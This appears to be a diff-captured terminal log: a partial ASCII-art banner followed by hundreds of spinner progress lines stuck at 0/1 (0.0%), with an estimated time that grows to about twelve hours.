+       \___║::║/        ;;;  `;;;;,  `;;;  ,;;-'````'     ;;;;``;;;;      ;;`;;      ;;,.    ;;;  
+           ║::║|        [[[    [[[[[. '[[  [[[   [[[[[[/   [[[,/[[['     ,[[ '[[,    [[[[, ,[[[[, 
+           ║::║|        $$$    $$$ "Y$c$$  "$$c.    "$$    $$$$$$c      c$$$cc$$$c   $$$$$$$$"$$$ 
+           ║::║_\       888    888    Y88   `Y8bo,,,o88o   888b "88bo,   888   888,  888 Y88" 888o
+            ██          MMM    MMM     YM     `'YMUP"YMM   MMMM   "W"    YMM   ""`   MMM  M'  "MMM
+            ██          
+            ██           
+            ██           
+            ██           
+                         
+
+[⣾] 0/1(0.0%)   Time: 0s/5s        
+[⣷] 0/1(0.0%)   Time: 0s/1m 45s        
+[⣯] 0/1(0.0%)   Time: 0s/3m 25s        
+[⣟] 0/1(0.0%)   Time: 0s/5m 6s        
+[⡿] 0/1(0.0%)   Time: 0s/6m 46s        
+[⢿] 0/1(0.0%)   Time: 0s/8m 26s        
+[⣻] 0/1(0.0%)   Time: 0s/10m 6s        
+[⣽] 0/1(0.0%)   Time: 0s/11m 47s        
+[⣾] 0/1(0.0%)   Time: 0s/13m 27s        
+[⣷] 0/1(0.0%)   Time: 0s/15m 7s        
+[⣯] 0/1(0.0%)   Time: 1s/16m 47s        
+[⣟] 0/1(0.0%)   Time: 1s/18m 28s        
+[⡿] 0/1(0.0%)   Time: 1s/20m 8s        
+[⢿] 0/1(0.0%)   Time: 1s/21m 48s        
+[⣻] 0/1(0.0%)   Time: 1s/23m 29s        
+[⣽] 0/1(0.0%)   Time: 1s/25m 9s        
+[⣾] 0/1(0.0%)   Time: 1s/26m 49s        
+[⣷] 0/1(0.0%)   Time: 1s/28m 29s        
+[⣯] 0/1(0.0%)   Time: 1s/30m 10s        
+[⣟] 0/1(0.0%)   Time: 1s/31m 50s        
+[⡿] 0/1(0.0%)   Time: 2s/33m 30s        
+[⢿] 0/1(0.0%)   Time: 2s/35m 10s        
+[⣻] 0/1(0.0%)   Time: 2s/36m 50s        
+[⣽] 0/1(0.0%)   Time: 2s/38m 31s        
+[⣾] 0/1(0.0%)   Time: 2s/40m 11s        
+[⣷] 0/1(0.0%)   Time: 2s/41m 51s        
+[⣯] 0/1(0.0%)   Time: 2s/43m 32s        
+[⣟] 0/1(0.0%)   Time: 2s/45m 12s        
+[⡿] 0/1(0.0%)   Time: 2s/46m 52s        
+[⢿] 0/1(0.0%)   Time: 2s/48m 33s        
+[⣻] 0/1(0.0%)   Time: 3s/50m 13s        
+[⣽] 0/1(0.0%)   Time: 3s/51m 53s        
+[⣾] 0/1(0.0%)   Time: 3s/53m 33s        
+[⣷] 0/1(0.0%)   Time: 3s/55m 14s        
+[⣯] 0/1(0.0%)   Time: 3s/56m 54s        
+[⣟] 0/1(0.0%)   Time: 3s/58m 34s        
+[⡿] 0/1(0.0%)   Time: 3s/1h 15s        
+[⢿] 0/1(0.0%)   Time: 3s/1h 1m 55s        
+[⣻] 0/1(0.0%)   Time: 3s/1h 3m 35s        
+[⣽] 0/1(0.0%)   Time: 3s/1h 5m 15s        
+[⣾] 0/1(0.0%)   Time: 4s/1h 6m 56s        
+[⣷] 0/1(0.0%)   Time: 4s/1h 8m 36s        
+[⣯] 0/1(0.0%)   Time: 4s/1h 10m 16s        
+[⣟] 0/1(0.0%)   Time: 4s/1h 11m 56s        
+[⡿] 0/1(0.0%)   Time: 4s/1h 13m 37s        
+[⢿] 0/1(0.0%)   Time: 4s/1h 15m 17s        
+[⣻] 0/1(0.0%)   Time: 4s/1h 16m 57s        
+[⣽] 0/1(0.0%)   Time: 4s/1h 18m 38s        
+[⣾] 0/1(0.0%)   Time: 4s/1h 20m 18s        
+[⣷] 0/1(0.0%)   Time: 4s/1h 21m 58s        
+[⣯] 0/1(0.0%)   Time: 5s/1h 23m 39s        
+[⣟] 0/1(0.0%)   Time: 5s/1h 25m 19s        
+[⡿] 0/1(0.0%)   Time: 5s/1h 26m 59s        
+[⢿] 0/1(0.0%)   Time: 5s/1h 28m 39s        
+[⣻] 0/1(0.0%)   Time: 5s/1h 30m 20s        
+[⣽] 0/1(0.0%)   Time: 5s/1h 32m 0s        
+[⣾] 0/1(0.0%)   Time: 5s/1h 33m 40s        
+[⣷] 0/1(0.0%)   Time: 5s/1h 35m 20s        
+[⣯] 0/1(0.0%)   Time: 5s/1h 37m 1s        
+[⣟] 0/1(0.0%)   Time: 5s/1h 38m 41s        
+[⡿] 0/1(0.0%)   Time: 6s/1h 40m 21s        
+[⢿] 0/1(0.0%)   Time: 6s/1h 42m 2s        
+[⣻] 0/1(0.0%)   Time: 6s/1h 43m 42s        
+[⣽] 0/1(0.0%)   Time: 6s/1h 45m 22s        
+[⣾] 0/1(0.0%)   Time: 6s/1h 47m 2s        
+[⣷] 0/1(0.0%)   Time: 6s/1h 48m 42s        
+[⣯] 0/1(0.0%)   Time: 6s/1h 50m 23s        
+[⣟] 0/1(0.0%)   Time: 6s/1h 52m 3s        
+[⡿] 0/1(0.0%)   Time: 6s/1h 53m 43s        
+[⢿] 0/1(0.0%)   Time: 6s/1h 55m 23s        
+[⣻] 0/1(0.0%)   Time: 7s/1h 57m 3s        
+[⣽] 0/1(0.0%)   Time: 7s/1h 58m 44s        
+[⣾] 0/1(0.0%)   Time: 7s/2h 24s        
+[⣷] 0/1(0.0%)   Time: 7s/2h 2m 4s        
+[⣯] 0/1(0.0%)   Time: 7s/2h 3m 44s        
+[⣟] 0/1(0.0%)   Time: 7s/2h 5m 25s        
+[⡿] 0/1(0.0%)   Time: 7s/2h 7m 5s        
+[⢿] 0/1(0.0%)   Time: 7s/2h 8m 45s        
+[⣻] 0/1(0.0%)   Time: 7s/2h 10m 25s        
+[⣽] 0/1(0.0%)   Time: 7s/2h 12m 6s        
+[⣾] 0/1(0.0%)   Time: 8s/2h 13m 46s        
+[⣷] 0/1(0.0%)   Time: 8s/2h 15m 26s        
+[⣯] 0/1(0.0%)   Time: 8s/2h 17m 6s        
+[⣟] 0/1(0.0%)   Time: 8s/2h 18m 47s        
+[⡿] 0/1(0.0%)   Time: 8s/2h 20m 27s        
+[⢿] 0/1(0.0%)   Time: 8s/2h 22m 7s        
+[⣻] 0/1(0.0%)   Time: 8s/2h 23m 48s        
+[⣽] 0/1(0.0%)   Time: 8s/2h 25m 28s        
+[⣾] 0/1(0.0%)   Time: 8s/2h 27m 8s        
+[⣷] 0/1(0.0%)   Time: 8s/2h 28m 48s        
+[⣯] 0/1(0.0%)   Time: 9s/2h 30m 28s        
+[⣟] 0/1(0.0%)   Time: 9s/2h 32m 9s        
+[⡿] 0/1(0.0%)   Time: 9s/2h 33m 49s        
+[⢿] 0/1(0.0%)   Time: 9s/2h 35m 29s        
+[⣻] 0/1(0.0%)   Time: 9s/2h 37m 9s        
+[⣽] 0/1(0.0%)   Time: 9s/2h 38m 50s        
+[⣾] 0/1(0.0%)   Time: 9s/2h 40m 30s        
+[⣷] 0/1(0.0%)   Time: 9s/2h 42m 10s        
+[⣯] 0/1(0.0%)   Time: 9s/2h 43m 50s        
+[⣟] 0/1(0.0%)   Time: 9s/2h 45m 31s        
+[⡿] 0/1(0.0%)   Time: 10s/2h 47m 11s        
+[⢿] 0/1(0.0%)   Time: 10s/2h 48m 51s        
+[⣻] 0/1(0.0%)   Time: 10s/2h 50m 31s        
+[⣽] 0/1(0.0%)   Time: 10s/2h 52m 12s        
+[⣾] 0/1(0.0%)   Time: 10s/2h 53m 52s        
+[⣷] 0/1(0.0%)   Time: 10s/2h 55m 33s        
+[⣯] 0/1(0.0%)   Time: 10s/2h 57m 13s        
+[⣟] 0/1(0.0%)   Time: 10s/2h 58m 53s        
+[⡿] 0/1(0.0%)   Time: 10s/3h 33s        
+[⢿] 0/1(0.0%)   Time: 10s/3h 2m 13s        
+[⣻] 0/1(0.0%)   Time: 11s/3h 3m 54s        
+[⣽] 0/1(0.0%)   Time: 11s/3h 5m 34s        
+[⣾] 0/1(0.0%)   Time: 11s/3h 7m 14s        
+[⣷] 0/1(0.0%)   Time: 11s/3h 8m 55s        
+[⣯] 0/1(0.0%)   Time: 11s/3h 10m 35s        
+[⣟] 0/1(0.0%)   Time: 11s/3h 12m 15s        
+[⡿] 0/1(0.0%)   Time: 11s/3h 13m 55s        
+[⢿] 0/1(0.0%)   Time: 11s/3h 15m 36s        
+[⣻] 0/1(0.0%)   Time: 11s/3h 17m 16s        
+[⣽] 0/1(0.0%)   Time: 11s/3h 18m 56s        
+[⣾] 0/1(0.0%)   Time: 12s/3h 20m 36s        
+[⣷] 0/1(0.0%)   Time: 12s/3h 22m 17s        
+[⣯] 0/1(0.0%)   Time: 12s/3h 23m 57s        
+[⣟] 0/1(0.0%)   Time: 12s/3h 25m 37s        
+[⡿] 0/1(0.0%)   Time: 12s/3h 27m 18s        
+[⢿] 0/1(0.0%)   Time: 12s/3h 28m 58s        
+[⣻] 0/1(0.0%)   Time: 12s/3h 30m 38s        
+[⣽] 0/1(0.0%)   Time: 12s/3h 32m 18s        
+[⣾] 0/1(0.0%)   Time: 12s/3h 33m 58s        
+[⣷] 0/1(0.0%)   Time: 12s/3h 35m 39s        
+[⣯] 0/1(0.0%)   Time: 13s/3h 37m 19s        
+[⣟] 0/1(0.0%)   Time: 13s/3h 38m 59s        
+[⡿] 0/1(0.0%)   Time: 13s/3h 40m 39s        
+[⢿] 0/1(0.0%)   Time: 13s/3h 42m 20s        
+[⣻] 0/1(0.0%)   Time: 13s/3h 44m 0s        
+[⣽] 0/1(0.0%)   Time: 13s/3h 45m 40s        
+[⣾] 0/1(0.0%)   Time: 13s/3h 47m 21s        
+[⣷] 0/1(0.0%)   Time: 13s/3h 49m 1s        
+[⣯] 0/1(0.0%)   Time: 13s/3h 50m 41s        
+[⣟] 0/1(0.0%)   Time: 13s/3h 52m 22s        
+[⡿] 0/1(0.0%)   Time: 14s/3h 54m 2s        
+[⢿] 0/1(0.0%)   Time: 14s/3h 55m 42s        
+[⣻] 0/1(0.0%)   Time: 14s/3h 57m 22s        
+[⣽] 0/1(0.0%)   Time: 14s/3h 59m 3s        
+[⣾] 0/1(0.0%)   Time: 14s/4h 43s        
+[⣷] 0/1(0.0%)   Time: 14s/4h 2m 23s        
+[⣯] 0/1(0.0%)   Time: 14s/4h 4m 4s        
+[⣟] 0/1(0.0%)   Time: 14s/4h 5m 44s        
+[⡿] 0/1(0.0%)   Time: 14s/4h 7m 24s        
+[⢿] 0/1(0.0%)   Time: 14s/4h 9m 4s        
+[⣻] 0/1(0.0%)   Time: 15s/4h 10m 45s        
+[⣽] 0/1(0.0%)   Time: 15s/4h 12m 25s        
+[⣾] 0/1(0.0%)   Time: 15s/4h 14m 5s        
+[⣷] 0/1(0.0%)   Time: 15s/4h 15m 45s        
+[⣯] 0/1(0.0%)   Time: 15s/4h 17m 26s        
+[⣟] 0/1(0.0%)   Time: 15s/4h 19m 6s        
+[⡿] 0/1(0.0%)   Time: 15s/4h 20m 46s        
+[⢿] 0/1(0.0%)   Time: 15s/4h 22m 26s        
+[⣻] 0/1(0.0%)   Time: 15s/4h 24m 7s        
+[⣽] 0/1(0.0%)   Time: 15s/4h 25m 47s        
+[⣾] 0/1(0.0%)   Time: 16s/4h 27m 27s        
+[⣷] 0/1(0.0%)   Time: 16s/4h 29m 8s        
+[⣯] 0/1(0.0%)   Time: 16s/4h 30m 48s        
+[⣟] 0/1(0.0%)   Time: 16s/4h 32m 28s        
+[⡿] 0/1(0.0%)   Time: 16s/4h 34m 8s        
+[⢿] 0/1(0.0%)   Time: 16s/4h 35m 48s        
+[⣻] 0/1(0.0%)   Time: 16s/4h 37m 29s        
+[⣽] 0/1(0.0%)   Time: 16s/4h 39m 9s        
+[⣾] 0/1(0.0%)   Time: 16s/4h 40m 49s        
+[⣷] 0/1(0.0%)   Time: 16s/4h 42m 29s        
+[⣯] 0/1(0.0%)   Time: 17s/4h 44m 10s        
+[⣟] 0/1(0.0%)   Time: 17s/4h 45m 50s        
+[⡿] 0/1(0.0%)   Time: 17s/4h 47m 30s        
+[⢿] 0/1(0.0%)   Time: 17s/4h 49m 10s        
+[⣻] 0/1(0.0%)   Time: 17s/4h 50m 51s        
+[⣽] 0/1(0.0%)   Time: 17s/4h 52m 31s        
+[⣾] 0/1(0.0%)   Time: 17s/4h 54m 11s        
+[⣷] 0/1(0.0%)   Time: 17s/4h 55m 51s        
+[⣯] 0/1(0.0%)   Time: 17s/4h 57m 32s        
+[⣟] 0/1(0.0%)   Time: 17s/4h 59m 12s        
+[⡿] 0/1(0.0%)   Time: 18s/5h 52s        
+[⢿] 0/1(0.0%)   Time: 18s/5h 2m 32s        
+[⣻] 0/1(0.0%)   Time: 18s/5h 4m 13s        
+[⣽] 0/1(0.0%)   Time: 18s/5h 5m 53s        
+[⣾] 0/1(0.0%)   Time: 18s/5h 7m 33s        
+[⣷] 0/1(0.0%)   Time: 18s/5h 9m 14s        
+[⣯] 0/1(0.0%)   Time: 18s/5h 10m 54s        
+[⣟] 0/1(0.0%)   Time: 18s/5h 12m 34s        
+[⡿] 0/1(0.0%)   Time: 18s/5h 14m 15s        
+[⢿] 0/1(0.0%)   Time: 18s/5h 15m 55s        
+[⣻] 0/1(0.0%)   Time: 19s/5h 17m 35s        
+[⣽] 0/1(0.0%)   Time: 19s/5h 19m 16s        
+[⣾] 0/1(0.0%)   Time: 19s/5h 20m 56s        
+[⣷] 0/1(0.0%)   Time: 19s/5h 22m 36s        
+[⣯] 0/1(0.0%)   Time: 19s/5h 24m 16s        
+[⣟] 0/1(0.0%)   Time: 19s/5h 25m 57s        
+[⡿] 0/1(0.0%)   Time: 19s/5h 27m 37s        
+[⢿] 0/1(0.0%)   Time: 19s/5h 29m 17s        
+[⣻] 0/1(0.0%)   Time: 19s/5h 30m 57s        
+[⣽] 0/1(0.0%)   Time: 19s/5h 32m 38s        
+[⣾] 0/1(0.0%)   Time: 20s/5h 34m 18s        
+[⣷] 0/1(0.0%)   Time: 20s/5h 35m 58s        
+[⣯] 0/1(0.0%)   Time: 20s/5h 37m 38s        
+[⣟] 0/1(0.0%)   Time: 20s/5h 39m 19s        
+[⡿] 0/1(0.0%)   Time: 20s/5h 40m 59s        
+[⢿] 0/1(0.0%)   Time: 20s/5h 42m 39s        
+[⣻] 0/1(0.0%)   Time: 20s/5h 44m 19s        
+[⣽] 0/1(0.0%)   Time: 20s/5h 46m 0s        
+[⣾] 0/1(0.0%)   Time: 20s/5h 47m 40s        
+[⣷] 0/1(0.0%)   Time: 20s/5h 49m 20s        
+[⣯] 0/1(0.0%)   Time: 21s/5h 51m 0s        
+[⣟] 0/1(0.0%)   Time: 21s/5h 52m 40s        
+[⡿] 0/1(0.0%)   Time: 21s/5h 54m 21s        
+[⢿] 0/1(0.0%)   Time: 21s/5h 56m 1s        
+[⣻] 0/1(0.0%)   Time: 21s/5h 57m 41s        
+[⣽] 0/1(0.0%)   Time: 21s/5h 59m 21s        
+[⣾] 0/1(0.0%)   Time: 21s/6h 1m 2s        
+[⣷] 0/1(0.0%)   Time: 21s/6h 2m 42s        
+[⣯] 0/1(0.0%)   Time: 21s/6h 4m 22s        
+[⣟] 0/1(0.0%)   Time: 21s/6h 6m 2s        
+[⡿] 0/1(0.0%)   Time: 22s/6h 7m 43s        
+[⢿] 0/1(0.0%)   Time: 22s/6h 9m 23s        
+[⣻] 0/1(0.0%)   Time: 22s/6h 11m 3s        
+[⣽] 0/1(0.0%)   Time: 22s/6h 12m 44s        
+[⣾] 0/1(0.0%)   Time: 22s/6h 14m 24s        
+[⣷] 0/1(0.0%)   Time: 22s/6h 16m 4s        
+[⣯] 0/1(0.0%)   Time: 22s/6h 17m 44s        
+[⣟] 0/1(0.0%)   Time: 22s/6h 19m 24s        
+[⡿] 0/1(0.0%)   Time: 22s/6h 21m 5s        
+[⢿] 0/1(0.0%)   Time: 22s/6h 22m 45s        
+[⣻] 0/1(0.0%)   Time: 23s/6h 24m 25s        
+[⣽] 0/1(0.0%)   Time: 23s/6h 26m 6s        
+[⣾] 0/1(0.0%)   Time: 23s/6h 27m 46s        
+[⣷] 0/1(0.0%)   Time: 23s/6h 29m 26s        
+[⣯] 0/1(0.0%)   Time: 23s/6h 31m 6s        
+[⣟] 0/1(0.0%)   Time: 23s/6h 32m 46s        
+[⡿] 0/1(0.0%)   Time: 23s/6h 34m 27s        
+[⢿] 0/1(0.0%)   Time: 23s/6h 36m 7s        
+[⣻] 0/1(0.0%)   Time: 23s/6h 37m 47s        
+[⣽] 0/1(0.0%)   Time: 23s/6h 39m 27s        
+[⣾] 0/1(0.0%)   Time: 24s/6h 41m 8s        
+[⣷] 0/1(0.0%)   Time: 24s/6h 42m 48s        
+[⣯] 0/1(0.0%)   Time: 24s/6h 44m 28s        
+[⣟] 0/1(0.0%)   Time: 24s/6h 46m 8s        
+[⡿] 0/1(0.0%)   Time: 24s/6h 47m 49s        
+[⢿] 0/1(0.0%)   Time: 24s/6h 49m 29s        
+[⣻] 0/1(0.0%)   Time: 24s/6h 51m 9s        
+[⣽] 0/1(0.0%)   Time: 24s/6h 52m 49s        
+[⣾] 0/1(0.0%)   Time: 24s/6h 54m 30s        
+[⣷] 0/1(0.0%)   Time: 24s/6h 56m 10s        
+[⣯] 0/1(0.0%)   Time: 25s/6h 57m 50s        
+[⣟] 0/1(0.0%)   Time: 25s/6h 59m 30s        
+[⡿] 0/1(0.0%)   Time: 25s/7h 1m 10s        
+[⢿] 0/1(0.0%)   Time: 25s/7h 2m 51s        
+[⣻] 0/1(0.0%)   Time: 25s/7h 4m 31s        
+[⣽] 0/1(0.0%)   Time: 25s/7h 6m 11s        
+[⣾] 0/1(0.0%)   Time: 25s/7h 7m 52s        
+[⣷] 0/1(0.0%)   Time: 25s/7h 9m 32s        
+[⣯] 0/1(0.0%)   Time: 25s/7h 11m 12s        
+[⣟] 0/1(0.0%)   Time: 25s/7h 12m 52s        
+[⡿] 0/1(0.0%)   Time: 26s/7h 14m 33s        
+[⢿] 0/1(0.0%)   Time: 26s/7h 16m 13s        
+[⣻] 0/1(0.0%)   Time: 26s/7h 17m 53s        
+[⣽] 0/1(0.0%)   Time: 26s/7h 19m 33s        
+[⣾] 0/1(0.0%)   Time: 26s/7h 21m 13s        
+[⣷] 0/1(0.0%)   Time: 26s/7h 22m 54s        
+[⣯] 0/1(0.0%)   Time: 26s/7h 24m 34s        
+[⣟] 0/1(0.0%)   Time: 26s/7h 26m 14s        
+[⡿] 0/1(0.0%)   Time: 26s/7h 27m 55s        
+[⢿] 0/1(0.0%)   Time: 26s/7h 29m 35s        
+[⣻] 0/1(0.0%)   Time: 27s/7h 31m 15s        
+[⣽] 0/1(0.0%)   Time: 27s/7h 32m 55s        
+[⣾] 0/1(0.0%)   Time: 27s/7h 34m 35s        
+[⣷] 0/1(0.0%)   Time: 27s/7h 36m 16s        
+[⣯] 0/1(0.0%)   Time: 27s/7h 37m 56s        
+[⣟] 0/1(0.0%)   Time: 27s/7h 39m 36s        
+[⡿] 0/1(0.0%)   Time: 27s/7h 41m 16s        
+[⢿] 0/1(0.0%)   Time: 27s/7h 42m 57s        
+[⣻] 0/1(0.0%)   Time: 27s/7h 44m 37s        
+[⣽] 0/1(0.0%)   Time: 27s/7h 46m 17s        
+[⣾] 0/1(0.0%)   Time: 28s/7h 47m 57s        
+[⣷] 0/1(0.0%)   Time: 28s/7h 49m 38s        
+[⣯] 0/1(0.0%)   Time: 28s/7h 51m 18s        
+[⣟] 0/1(0.0%)   Time: 28s/7h 52m 58s        
+[⡿] 0/1(0.0%)   Time: 28s/7h 54m 39s        
+[⢿] 0/1(0.0%)   Time: 28s/7h 56m 19s        
+[⣻] 0/1(0.0%)   Time: 28s/7h 57m 59s        
+[⣽] 0/1(0.0%)   Time: 28s/7h 59m 39s        
+[⣾] 0/1(0.0%)   Time: 28s/8h 1m 20s        
+[⣷] 0/1(0.0%)   Time: 28s/8h 3m 0s        
+[⣯] 0/1(0.0%)   Time: 29s/8h 4m 40s        
+[⣟] 0/1(0.0%)   Time: 29s/8h 6m 20s        
+[⡿] 0/1(0.0%)   Time: 29s/8h 8m 1s        
+[⢿] 0/1(0.0%)   Time: 29s/8h 9m 41s        
+[⣻] 0/1(0.0%)   Time: 29s/8h 11m 21s        
+[⣽] 0/1(0.0%)   Time: 29s/8h 13m 1s        
+[⣾] 0/1(0.0%)   Time: 29s/8h 14m 42s        
+[⣷] 0/1(0.0%)   Time: 29s/8h 16m 22s        
+[⣯] 0/1(0.0%)   Time: 29s/8h 18m 2s        
+[⣟] 0/1(0.0%)   Time: 29s/8h 19m 42s        
+[⡿] 0/1(0.0%)   Time: 30s/8h 21m 23s        
+[⢿] 0/1(0.0%)   Time: 30s/8h 23m 3s        
+[⣻] 0/1(0.0%)   Time: 30s/8h 24m 43s        
+[⣽] 0/1(0.0%)   Time: 30s/8h 26m 23s        
+[⣾] 0/1(0.0%)   Time: 30s/8h 28m 4s        
+[⣷] 0/1(0.0%)   Time: 30s/8h 29m 44s        
+[⣯] 0/1(0.0%)   Time: 30s/8h 31m 24s        
+[⣟] 0/1(0.0%)   Time: 30s/8h 33m 4s        
+[⡿] 0/1(0.0%)   Time: 30s/8h 34m 44s        
+[⢿] 0/1(0.0%)   Time: 30s/8h 36m 25s        
+[⣻] 0/1(0.0%)   Time: 31s/8h 38m 5s        
+[⣽] 0/1(0.0%)   Time: 31s/8h 39m 45s        
+[⣾] 0/1(0.0%)   Time: 31s/8h 41m 25s        
+[⣷] 0/1(0.0%)   Time: 31s/8h 43m 6s        
+[⣯] 0/1(0.0%)   Time: 31s/8h 44m 46s        
+[⣟] 0/1(0.0%)   Time: 31s/8h 46m 26s        
+[⡿] 0/1(0.0%)   Time: 31s/8h 48m 7s        
+[⢿] 0/1(0.0%)   Time: 31s/8h 49m 47s        
+[⣻] 0/1(0.0%)   Time: 31s/8h 51m 27s        
+[⣽] 0/1(0.0%)   Time: 31s/8h 53m 7s        
+[⣾] 0/1(0.0%)   Time: 32s/8h 54m 48s        
+[⣷] 0/1(0.0%)   Time: 32s/8h 56m 28s        
+[⣯] 0/1(0.0%)   Time: 32s/8h 58m 8s        
+[⣟] 0/1(0.0%)   Time: 32s/8h 59m 48s        
+[⡿] 0/1(0.0%)   Time: 32s/9h 1m 28s        
+[⢿] 0/1(0.0%)   Time: 32s/9h 3m 9s        
+[⣻] 0/1(0.0%)   Time: 32s/9h 4m 49s        
+[⣽] 0/1(0.0%)   Time: 32s/9h 6m 29s        
+[⣾] 0/1(0.0%)   Time: 32s/9h 8m 10s        
+[⣷] 0/1(0.0%)   Time: 32s/9h 9m 50s        
+[⣯] 0/1(0.0%)   Time: 33s/9h 11m 30s        
+[⣟] 0/1(0.0%)   Time: 33s/9h 13m 10s        
+[⡿] 0/1(0.0%)   Time: 33s/9h 14m 51s        
+[⢿] 0/1(0.0%)   Time: 33s/9h 16m 31s        
+[⣻] 0/1(0.0%)   Time: 33s/9h 18m 11s        
+[⣽] 0/1(0.0%)   Time: 33s/9h 19m 51s        
+[⣾] 0/1(0.0%)   Time: 33s/9h 21m 31s        
+[⣷] 0/1(0.0%)   Time: 33s/9h 23m 12s        
+[⣯] 0/1(0.0%)   Time: 33s/9h 24m 52s        
+[⣟] 0/1(0.0%)   Time: 33s/9h 26m 32s        
+[⡿] 0/1(0.0%)   Time: 34s/9h 28m 12s        
+[⢿] 0/1(0.0%)   Time: 34s/9h 29m 53s        
+[⣻] 0/1(0.0%)   Time: 34s/9h 31m 33s        
+[⣽] 0/1(0.0%)   Time: 34s/9h 33m 13s        
+[⣾] 0/1(0.0%)   Time: 34s/9h 34m 54s        
+[⣷] 0/1(0.0%)   Time: 34s/9h 36m 34s        
+[⣯] 0/1(0.0%)   Time: 34s/9h 38m 14s        
+[⣟] 0/1(0.0%)   Time: 34s/9h 39m 54s        
+[⡿] 0/1(0.0%)   Time: 34s/9h 41m 35s        
+[⢿] 0/1(0.0%)   Time: 34s/9h 43m 15s        
+[⣻] 0/1(0.0%)   Time: 35s/9h 44m 55s        
+[⣽] 0/1(0.0%)   Time: 35s/9h 46m 36s        
+[⣾] 0/1(0.0%)   Time: 35s/9h 48m 16s        
+[⣷] 0/1(0.0%)   Time: 35s/9h 49m 56s        
+[⣯] 0/1(0.0%)   Time: 35s/9h 51m 36s        
+[⣟] 0/1(0.0%)   Time: 35s/9h 53m 17s        
+[⡿] 0/1(0.0%)   Time: 35s/9h 54m 57s        
+[⢿] 0/1(0.0%)   Time: 35s/9h 56m 37s        
+[⣻] 0/1(0.0%)   Time: 35s/9h 58m 17s        
+[⣽] 0/1(0.0%)   Time: 35s/9h 59m 58s        
+[⣾] 0/1(0.0%)   Time: 36s/10h 1m 38s        
+[⣷] 0/1(0.0%)   Time: 36s/10h 3m 18s        
+[⣯] 0/1(0.0%)   Time: 36s/10h 4m 58s        
+[⣟] 0/1(0.0%)   Time: 36s/10h 6m 38s        
+[⡿] 0/1(0.0%)   Time: 36s/10h 8m 19s        
+[⢿] 0/1(0.0%)   Time: 36s/10h 9m 59s        
+[⣻] 0/1(0.0%)   Time: 36s/10h 11m 39s        
+[⣽] 0/1(0.0%)   Time: 36s/10h 13m 19s        
+[⣾] 0/1(0.0%)   Time: 36s/10h 15m 0s        
+[⣷] 0/1(0.0%)   Time: 37s/10h 16m 40s        
+[⣯] 0/1(0.0%)   Time: 37s/10h 18m 20s        
+[⣟] 0/1(0.0%)   Time: 37s/10h 20m 1s        
+[⡿] 0/1(0.0%)   Time: 37s/10h 21m 41s        
+[⢿] 0/1(0.0%)   Time: 37s/10h 23m 21s        
+[⣻] 0/1(0.0%)   Time: 37s/10h 25m 1s        
+[⣽] 0/1(0.0%)   Time: 37s/10h 26m 42s        
+[⣾] 0/1(0.0%)   Time: 37s/10h 28m 22s        
+[⣷] 0/1(0.0%)   Time: 37s/10h 30m 2s        
+[⣯] 0/1(0.0%)   Time: 37s/10h 31m 43s        
+[⣟] 0/1(0.0%)   Time: 38s/10h 33m 23s        
+[⡿] 0/1(0.0%)   Time: 38s/10h 35m 3s        
+[⢿] 0/1(0.0%)   Time: 38s/10h 36m 44s        
+[⣻] 0/1(0.0%)   Time: 38s/10h 38m 24s        
+[⣽] 0/1(0.0%)   Time: 38s/10h 40m 4s        
+[⣾] 0/1(0.0%)   Time: 38s/10h 41m 44s        
+[⣷] 0/1(0.0%)   Time: 38s/10h 43m 25s        
+[⣯] 0/1(0.0%)   Time: 38s/10h 45m 5s        
+[⣟] 0/1(0.0%)   Time: 38s/10h 46m 45s        
+[⡿] 0/1(0.0%)   Time: 38s/10h 48m 25s        
+[⢿] 0/1(0.0%)   Time: 39s/10h 50m 6s        
+[⣻] 0/1(0.0%)   Time: 39s/10h 51m 46s        
+[⣽] 0/1(0.0%)   Time: 39s/10h 53m 26s        
+[⣾] 0/1(0.0%)   Time: 39s/10h 55m 7s        
+[⣷] 0/1(0.0%)   Time: 39s/10h 56m 47s        
+[⣯] 0/1(0.0%)   Time: 39s/10h 58m 27s        
+[⣟] 0/1(0.0%)   Time: 39s/11h 7s        
+[⡿] 0/1(0.0%)   Time: 39s/11h 1m 48s        
+[⢿] 0/1(0.0%)   Time: 39s/11h 3m 28s        
+[⣻] 0/1(0.0%)   Time: 39s/11h 5m 8s        
+[⣽] 0/1(0.0%)   Time: 40s/11h 6m 48s        
+[⣾] 0/1(0.0%)   Time: 40s/11h 8m 29s        
+[⣷] 0/1(0.0%)   Time: 40s/11h 10m 9s        
+[⣯] 0/1(0.0%)   Time: 40s/11h 11m 49s        
+[⣟] 0/1(0.0%)   Time: 40s/11h 13m 29s        
+[⡿] 0/1(0.0%)   Time: 40s/11h 15m 10s        
+[⢿] 0/1(0.0%)   Time: 40s/11h 16m 50s        
+[⣻] 0/1(0.0%)   Time: 40s/11h 18m 30s        
+[⣽] 0/1(0.0%)   Time: 40s/11h 20m 10s        
+[⣾] 0/1(0.0%)   Time: 40s/11h 21m 51s        
+[⣷] 0/1(0.0%)   Time: 41s/11h 23m 31s        
+[⣯] 0/1(0.0%)   Time: 41s/11h 25m 11s        
+[⣟] 0/1(0.0%)   Time: 41s/11h 26m 52s        
+[⡿] 0/1(0.0%)   Time: 41s/11h 28m 32s        
+[⢿] 0/1(0.0%)   Time: 41s/11h 30m 12s        
+[⣻] 0/1(0.0%)   Time: 41s/11h 31m 53s        
+[⣽] 0/1(0.0%)   Time: 41s/11h 33m 33s        
+[⣾] 0/1(0.0%)   Time: 41s/11h 35m 13s        
+[⣷] 0/1(0.0%)   Time: 41s/11h 36m 53s        
+[⣯] 0/1(0.0%)   Time: 41s/11h 38m 34s        
+[⣟] 0/1(0.0%)   Time: 42s/11h 40m 14s        
+[⡿] 0/1(0.0%)   Time: 42s/11h 41m 54s        
+[⢿] 0/1(0.0%)   Time: 42s/11h 43m 34s        
+[⣻] 0/1(0.0%)   Time: 42s/11h 45m 14s        
+[⣽] 0/1(0.0%)   Time: 42s/11h 46m 55s        
+[⣾] 0/1(0.0%)   Time: 42s/11h 48m 35s        
+[⣷] 0/1(0.0%)   Time: 42s/11h 50m 15s        
+[⣯] 0/1(0.0%)   Time: 42s/11h 51m 56s        
+[⣟] 0/1(0.0%)   Time: 42s/11h 53m 36s        
+[⡿] 0/1(0.0%)   Time: 42s/11h 55m 16s        
+[⢿] 0/1(0.0%)   Time: 43s/11h 56m 57s        
+[⣻] 0/1(0.0%)   Time: 43s/11h 58m 37s        
+[⣽] 0/1(0.0%)   Time: 43s/12h 17s        
+[⣾] 0/1(0.0%)   Time: 43s/12h 1m 57s        
+[⣷] 0/1(0.0%)   Time: 43s/12h 3m 38s        
+[⣯] 0/1(0.0%)   Time: 43s/12h 5m 18s        
